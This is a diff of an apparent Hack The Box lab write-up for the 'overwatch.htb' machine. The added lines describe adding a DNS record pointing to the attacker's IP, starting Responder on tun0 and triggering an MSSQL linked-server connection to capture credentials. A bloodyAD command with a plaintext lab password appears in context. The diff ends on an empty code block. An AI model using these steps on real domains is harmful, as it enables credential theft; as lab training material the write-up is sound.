@@ -414,5 +414,23 @@ bloodyAD --host s200401.overwatch.htb -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw
 [+] SQL07 has been successfully added
 ```
 
-So first ill add the 
+So first ill add the DNS record with my IP in for the server
+
+```python
+sudo responder -I tun0
+```
+
+Then ill start up responder
+
+```python
+SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07
+```
+
+Then ill trigger it
+
+![](Pasted%20image%2020260810172439.png)
+
+```python
+
+```
 
